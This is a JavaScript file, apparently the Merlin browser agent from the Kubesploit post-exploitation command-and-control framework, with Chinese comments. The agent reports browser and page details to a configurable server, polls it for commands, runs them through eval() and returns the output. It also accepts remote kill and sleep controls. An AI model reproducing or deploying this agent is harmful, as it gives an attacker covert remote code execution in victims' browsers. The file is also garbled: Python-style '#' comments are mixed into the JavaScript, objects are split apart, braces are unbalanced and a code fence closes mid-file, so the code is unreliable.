# `kubesploit\data\html\scripts\merlin.js`

```
// Kubesploit是一个基于Russel Van Tuyl的Merlin构建的后渗透命令和控制框架。
// 本文件是Kubesploit的一部分。
// 版权所有 2021 CyberArk Software Ltd. 保留所有权利。

// Kubesploit是自由软件：您可以根据GNU通用公共许可证的条款重新分发和/或修改它，
// 无论是许可证的第3版还是以后的版本。

// Kubesploit的分发希望能够有助于增强组织的安全性。
// Kubesploit不得以任何恶意方式使用。
// Kubesploit按原样分发，没有任何保证；包括适销性或特定用途的隐含保证。请参阅
// GNU通用公共许可证以获取更多详细信息。

// 您应该已经收到了GNU通用公共许可证的副本
// 与Kubesploit一起。如果没有，请参见<http://www.gnu.org/licenses/>。

// 全局变量
var debug = false;
// 设置是否显示详细信息
var verbose = true;
// 设置初始状态为真
var initial = true;
// 生成唯一标识符
var hostUUID = guid();
// 设置版本号
var version = "0.6.3.BETA";
// 设置构建版本
var build = "nonRelease";
// 设置等待时间，单位为毫秒
var waitTime = 30000;
// 设置最大重试次数
var maxRetry = 7;
// 设置最大填充值
var paddingMax = 4096;
// 设置失败检查次数
var failedCheckin = 0;
// 设置请求的URL
var url = "https://127.0.0.1:443/";
// 获取日志元素
var log = document.getElementById("merlinLog");
// 设置日期格式化选项
var options = {localeMatcher: "lookup", year: 'numeric', month: 'long', day: 'numeric', hour: 'numeric',
    minute: 'numeric', second: 'numeric'};

// 如果处于调试模式，则在控制台输出信息
if (debug){console.log("Starting Merlin JavaScript Agent")}

// 生成唯一标识符的函数
// 参考链接：https://stackoverflow.com/questions/105034/create-guid-uuid-in-javascript
function guid() {
    return s4() + s4() + '-' + s4() + '-' + s4() + '-' +
        s4() + '-' + s4() + s4() + s4();
// 生成一个四位的随机字符串
function s4() {
    return Math.floor((1 + Math.random()) * 0x10000)
        .toString(16)
        .substring(1);
}

// 基础消息对象
var b = {
    "version": version, // 版本号
    "id": hostUUID, // 主机UUID
    "type": null, // 消息类型
    "padding": "RandomDataGoesHere", // 填充数据，暂未实现
    "payload": null // 消息载荷
};

// 系统信息消息对象
var s = {
    "platform": navigator.platform, // 平台信息
    // 其他系统信息属性...
};
    # 获取浏览器的应用代码名称
    "architecture": navigator.appCodeName,
    # 获取浏览器的用户代理字符串
    "username": navigator.userAgent,
    # 获取浏览器的版本信息
    "userguid": navigator.appVersion,
    # 获取当前文档的标题
    "hostname": document.title
};

# 初始化检查
function initialCheckIn (){
    # 如果处于调试模式，则在控制台输出调试信息
    if (debug){console.log("[DEBUG]Entering into initialCheckIn function")}
    # 创建一个新的 XMLHttpRequest 对象
    var x = new XMLHttpRequest();
    # 定义包含各种信息的对象 a
    var a = {
        # 版本号
        "version": version,
        # 构建号
        "build": build,
        # 等待时间，以毫秒为单位
        "waittime": (waitTime.toString())+ "ms", // TODO fix hard coding the duration to milliseconds with ms
        # 最大填充值
        "paddingmax": paddingMax,
        # 最大重试次数
        "maxretry": maxRetry,
        # 失败的检查次数
        "failedcheckin": failedCheckin,
        # 传输协议
        "proto": "h2",
        # 系统信息
        "sysinfo": s
    };
    # 设置消息类型为 InitialCheckIn
    b.type = "InitialCheckIn";
    # 设置消息载荷为 a
    b.payload = a;
    # 如果 verbose 为真，则输出连接到 web 服务器的信息
    if (verbose){verboseMessage("note", "Connecting to web server at " + url + " for initial check in.")}
    # 当状态改变时执行的回调函数
    x.onreadystatechange = function() {
        # 如果状态为 4（完成）且状态码为 200（成功），则将 initial 设为 false，failedCheckin 设为 0
        if (this.readyState == 4 && this.status == 200) {
            initial = false;
            failedCheckin = 0;
        }
    };
    # 打开一个 POST 请求，url 为请求的 URL，true 表示异步
    x.open('POST', url, true);
    # 设置请求头的 Content-Type 为 application/json; charset=UTF-8
    x.setRequestHeader("Content-Type", "application/json; charset=UTF-8");
    # 如果 debug 为真，则输出发送 InitialCheckIn XHR 的调试信息
    if (debug){console.log("[DEBUG]Sending InitialCheckIn XHR")}
    # 当发生错误时执行的回调函数
    x.onerror = function(e) {
        # failedCheckin 加一，输出警告信息，如果 debug 为真，则输出错误信息
        failedCheckin++;
        verboseMessage("warn", failedCheckin + " out of " + maxRetry + " total failed checkins");
        if (debug){
            console.log("[DEBUG]initialCheckIn POST request error:");
            console.log(e)
        }
    };
# 如果调试模式开启，打印调试信息：发送 initialCheckIn XHR 负载
# 打印负载内容
if (debug){
    console.log("[DEBUG]Sending initialCheckIn XHR payload:");
    console.log(b)
}
# 发送 XHR 请求，将负载内容转换为 JSON 字符串
x.send(JSON.stringify(b));
}

# 定义 agentInfo 函数
function agentInfo (){
    # 如果调试模式开启，打印调试信息：进入 agentInfo 函数
    if (debug){console.log("[DEBUG]Entering into agentInfo function")}
    # 创建 XMLHttpRequest 对象
    var x = new XMLHttpRequest();
    # 定义包含代理信息的对象 a
    var a = {
        "version": version,
        "build": build,
        "waittime": (waitTime.toString())+ "ms", // TODO fix hard coding the duration to milliseconds with ms
        "paddingmax": paddingMax,
        "maxretry": maxRetry,
        "failedcheckin": failedCheckin,
        "proto": "h2",
        "sysinfo": s
    };
    # 设置属性类型为"AgentInfo"
    b.type = "AgentInfo";
    # 将a赋值给payload属性
    b.payload = a;
    # 如果verbose为真，则输出连接到web服务器的信息
    if (verbose){verboseMessage("note", "Connecting to web server at " + url + " to update agent configuration " +
        "information.")}
    # 当状态改变时执行的回调函数
    x.onreadystatechange = function() {
        # 如果状态为4且状态码为200，则调用main函数
        if (this.readyState == 4 && this.status == 200) {
            main();
        }
    };
    # 打开一个新的POST请求
    x.open('POST', url, true);
    # 设置请求头的Content-Type
    x.setRequestHeader("Content-Type", "application/json; charset=UTF-8");
    # 如果debug为真，则输出发送的AgentInfo XHR
    if (debug){
        console.log("[DEBUG]Sending AgentInfo XHR:");
        console.log(b);
    }
    # 发送请求并将b转换为JSON字符串
    x.send(JSON.stringify(b));
}

# 定义statusCheckIn函数
function statusCheckIn (){
    # 如果debug为真，则输出进入statusCheckIn函数的信息
    if (debug){console.log("[DEBUG]Entering into statusCheckIn function")}
    // 创建一个新的 XMLHttpRequest 对象
    var x = new XMLHttpRequest();
    // 设置请求类型为 "StatusCheckIn"
    b.type = "StatusCheckIn";
    // 当 readyState 改变时执行的函数
    x.onreadystatechange = function() {
        // 如果 readyState 为 4 且 status 为 200，则执行以下操作
        if (this.readyState == 4 && this.status == 200) {
            // 重置失败计数
            failedCheckin = 0;
            // 解析响应的 JSON 数据
            var j = JSON.parse(x.responseText);
            // 处理 JSON 数据
            processJSON(j.type, j);
        }
    };
    // 如果 verbose 为真，则输出连接到服务器的信息
    if (verbose){verboseMessage("note", "Connecting to web server at " + url + " for status check in.")}
    // 打开一个 POST 请求，url 为请求的 URL，true 表示异步请求
    x.open('POST', url, true);
    // 设置请求头的 Content-Type
    x.setRequestHeader("Content-Type", "application/json; charset=UTF-8");
    // 如果 debug 为真，则输出调试信息
    if (debug){console.log("[DEBUG]Sending StatusCheckIn XHR")}
    // 当发送请求出错时执行的函数
    x.onerror = function(e) {
        // 增加失败计数
        failedCheckin++;
        // 输出警告信息
        verboseMessage("warn", failedCheckin + " out of " + maxRetry + " total failed checkins");
        verboseMessage("warn", "Error: " + e.message)
    };
    // 发送请求，发送的数据为 b 对象的 JSON 字符串
    x.send(JSON.stringify(b));
}
// 定义一个函数，用于发送命令执行结果到服务器
function cmdResults(job, stdOut, stdErr){
    // 如果开启了调试模式，打印调试信息
    if (debug){console.log("[DEBUG]Entering into cmdResults function")}
    // 创建一个新的 XMLHttpRequest 对象
    var x = new XMLHttpRequest();
    // 构建包含作业、标准输出和标准错误的参数对象
    var p = {
        "job": job,
        "stdout": stdOut,
        "stderr": stdErr
    };
    // 设置消息类型为 CmdResults
    b.type = "CmdResults";
    // 将参数对象作为负载添加到消息中
    b.payload = p;
    // 如果开启了详细模式，打印连接到服务器的信息
    if (verbose){verboseMessage("note", "Connecting to web server at " + url + " for CmdResults message.")}
    // 打开一个 POST 请求，向指定的 URL 发送数据
    x.open('POST', url, true);
    // 设置请求头的内容类型
    x.setRequestHeader("Content-Type", "application/json; charset=UTF-8");
    // 如果开启了调试模式，打印发送消息的调试信息
    if (debug){console.log("[DEBUG]Sending cmdResults XHR")}
    // 如果发送过程中出现错误，打印警告信息
    x.onerror = function(e) {
        verboseMessage("warn", "There was an error sending the CmdResults message.");
        verboseMessage("warn", "Error: " + e.message)
    };
    // 将消息对象转换为 JSON 字符串并发送
    x.send(JSON.stringify(b));
}
# 定义一个函数，用于输出详细信息
function verboseMessage(type, message){
    # 如果 debug 开启，则在控制台输出进入 verboseMessage 函数的调试信息
    if (debug){console.log("[DEBUG]Entering into verboseMessage function")}
    # 如果 verbose 开启且 log 不为空，则根据消息类型在 log 中插入相应样式的消息
    if (verbose && log != null){
        # 根据消息类型插入不同样式的消息
        switch (type){
            case "success":
                log.insertAdjacentHTML("beforeend", "<div style=\"color:lawngreen;\">[+]" + message + "</div>");
                break;
            case "note":
                log.insertAdjacentHTML("beforeend", "<div style=\"color:yellow;\">[-]" + message + "</div>");
                break;
            case "warn":
                log.insertAdjacentHTML("beforeend", "<div style=\"color:orangered;\">[!]" + message + "</div>");
                break;
            default:
                log.insertAdjacentHTML("beforeend", "<div style=\"color:red;\">[!]Unrecognized message type: " + type +
                    "<br>Message: " +  message + "</div>");
                break;
        }
```

    }
}

// 处理传入的 JSON 数据
function processJSON(type, json){
    // 如果调试模式开启，打印进入 processJSON 函数的调试信息
    if (debug){console.log("[DEBUG]Entering into processJSON function")}
    // 打印成功接收到特定类型消息的详细信息
    verboseMessage("success", type + " message type received!");
    // 根据消息类型进行不同的处理
    switch (type){
        // 如果消息类型为 "ServerOk"，则不做任何处理
        case "ServerOk":
            break;
        // 如果消息类型为 "CmdPayload"，则执行相应的命令
        case "CmdPayload":
            // 打印执行的命令和参数
            verboseMessage("note", "Executing command: " + json.payload['executable'] + " " + json.payload['args']);
            // 声明两个变量用于存储命令执行的标准输出和标准错误
            var stdOut;
            var stdErr;
            // 尝试执行命令
            try {
                // 执行 JSON 数据中的可执行文件和参数，并将结果存储到 stdOut 变量中
                stdOut = eval(json.payload['executable'] + " " + json.payload['args']);
                // 如果标准输出的类型为 'undefined'，则将其转换为字符串
                if (typeof stdOut == "undefined") {
                    stdOut = "JavaScript command completed successfully and returned type 'undefined'"
                } else {
                    stdOut = stdOut.toString();
                }
                // 初始化错误信息字符串
                stdErr = "";
                // 输出成功信息和命令输出
                verboseMessage("success", "Command output: " + stdOut);
            } catch (e){
                // 如果有异常，将异常信息存入错误信息字符串
                stdErr = e.toString();
                // 输出警告信息和错误信息
                verboseMessage("warn", "There was an error processing the command: " + stdErr);
                // 清空命令输出
                stdOut = "";
            }
            // 调用cmdResults函数，传入作业信息、命令输出和错误信息
            cmdResults(json.payload['job'], stdOut, stdErr);
            // 结束当前case
            break;
        case "AgentControl":
            // 根据不同的命令进行处理
            switch (json.payload["command"]){
                case "kill":
                    // 输出警告信息，表示接收到Agent Kill消息
                    verboseMessage("warn", "Received Agent Kill Message");
                    // 清除定时器，停止运行
                    clearInterval(run);
                    // 注释掉的代码，可能是用于输出Agent成功被杀死的信息
                    //cmdResults(json.payload['job'],"Agent " + hostUUID + " successfully killed.", "");
                    break;
                case "sleep":
                    // 输出提示信息，设置Agent的休眠时间
                    verboseMessage("note", "Setting agent sleep time to " + json.payload["args"] + " milliseconds");
                    // 将传入的休眠时间参数转换为整数
                    var i = parseInt(json.payload["args"]);
                    // 如果转换成功
                    if (!isNaN(i)){
# 设置等待时间为 i
waitTime = i;
# 发送命令结果，告知 Agent 成功将睡眠时间设置为 waitTime 毫秒
cmdResults(json.payload['job'],"Agent sleep successfully set to " + waitTime + " milliseconds.", "");
# 获取 Agent 信息
agentInfo();
# 如果条件为真，执行以下代码
} else {
    # 发送警告消息，告知设置睡眠时间出错
    verboseMessage("warn", "There was an error setting sleep to " + json.payload["args"]);
    # 发送命令结果，告知设置 Agent 睡眠时间失败
    cmdResults(json.payload['job'],"","Setting agent sleep time failed.");
}
# 结束 switch 语句
break;
# 如果收到 "initialize" 消息，执行以下代码
case "initialize":
    # 发送提示消息，告知收到 Agent 重新初始化消息
    verboseMessage("note", "Received agent re-initialize message");
    # 将 initial 设置为 true
    initial = true;
    # 结束 switch 语句
    break;
# 如果收到 "maxretry" 消息，执行以下代码
case "maxretry":
    # 发送提示消息，告知设置 Agent 最大重试次数为 json.payload["args"]
    verboseMessage("note","Setting agent max retries to " + json.payload["args"]);
    # 将 json.payload["args"] 转换为整数
    var i = parseInt(json.payload["args"]);
    # 如果 i 不是 NaN，执行以下代码
    if (!isNaN(i)){
        # 将最大重试次数设置为 i
        maxRetry = i;
        # 发送命令结果，告知成功将 Agent 最大重试次数设置为 maxRetry
        cmdResults(json.payload['job'],"Agent maxretry successfully set to " + maxRetry + ".", "");
        # 获取 Agent 信息
        agentInfo();
// 如果收到的控制类型是maxretries，则设置最大重试次数
} else {
    // 输出警告信息
    verboseMessage("warn", "There was an error setting max retries to " + json.payload["args"]);
    // 将设置最大重试次数失败的信息返回给服务器
    cmdResults(json.payload['job'],"","Setting agent maxretry failed.");
}
// 结束switch语句
break;
// 如果收到的控制类型是padding，则设置消息的最大填充大小
case "padding":
    // 输出提示信息
    verboseMessage("note", "Setting agent message maximum padding size to " + json.payload["args"]);
    // 将收到的参数转换为整数
    var i = parseInt(json.payload["args"]);
    // 如果参数是一个合法的数字
    if (!isNaN(i)){
        // 设置消息的最大填充大小
        paddingMax = i;
        // 将设置消息的最大填充大小成功的信息返回给服务器
        cmdResults(json.payload['job'],"Agent padding max successfully set to " + paddingMax +
            " bytes.", "");
        // 获取代理信息
        agentInfo();
    } else {
        // 输出警告信息
        verboseMessage("warn", "There was an error setting padding max to " + json.payload["args"]);
        // 将设置消息的最大填充大小失败的信息返回给服务器
        cmdResults(json.payload['job'],"","Setting agent padding max failed.");
    }
    // 结束switch语句
    break;
// 如果收到的控制类型是其他未知类型
default:
    // 输出警告信息
    verboseMessage("warn", "Unknown AgentControl control type: " + json.payload["command"]);
// 根据消息类型执行相应的操作
switch (type) {
    case "AgentControl":
        // 执行代理控制命令，并返回结果
        cmdResults(json.payload['job'],"","Unknown AgentControl control type: " + json.payload["command"]);
        break;
    case "FileTransfer":
        // 文件传输在 JavaScript 代理中尚未实现
        cmdResults(json.payload['job'],"","File transfer has not been implemented in the JavaScript Agent!");
        break;
    default:
        // 输出警告信息，执行默认操作，并返回结果
        verboseMessage("warn", "Unknown message type: " + type);
        cmdResults(json.payload['job'],"","Unknown message type: " + type);
        break;
}

// 主函数
function main(){
    // 如果处于调试模式，则输出调试信息
    if (debug){console.log("[DEBUG]Entering into main function")}
    // 如果检查失败次数小于最大重试次数
    if (failedCheckin < maxRetry) {
        // 如果是初始检查
        if (initial) {
            initialCheckIn();
        } else if (!initial) {
            // 如果不是初始检查
// 调用 statusCheckIn 函数
statusCheckIn();
// 如果失败次数等于最大重试次数，输出警告信息并关闭定时器
} else if (failedCheckin == maxRetry){
    verboseMessage("warn", "Max retries of " + maxRetry + " reached, shutting down the agent.");
    clearInterval(run);
    return;
}
// 如果 verbose 为真，输出当前时间和等待时间
if (verbose){
    var today  = new Date();
    verboseMessage("note", "Sleeping for " + waitTime + " milliseconds at " + today.toLocaleString("en-US", options))
}

// 检查是否有覆盖 URL，如果有则将 url 设置为 oURL
if (typeof oURL == 'string'){url=oURL}

// 如果 verbose 为真，输出启动信息、版本信息、UUID 和平台信息
if (verbose){
    verboseMessage("success", "Starting Merlin JavaScript Agent");
    verboseMessage("note", "Agent version: " + version);
    verboseMessage("note", "Agent build: " + build);
    verboseMessage("note", "Agent UUID: " + hostUUID);
    verboseMessage("note", "Platform: " + navigator.appCodeName);
}
# 调用 verboseMessage 函数，输出用户设备的架构信息
verboseMessage("note", "Architecture: " + navigator.platform);
# 调用 verboseMessage 函数，输出用户代理信息
verboseMessage("note", "User Name: " + navigator.userAgent);
# 调用 verboseMessage 函数，输出用户应用版本信息
verboseMessage("note", "User GUID: " + navigator.appVersion);
# 设置定时器，每隔 waitTime 毫秒调用一次 main 函数
var run = setInterval(main, waitTime);
```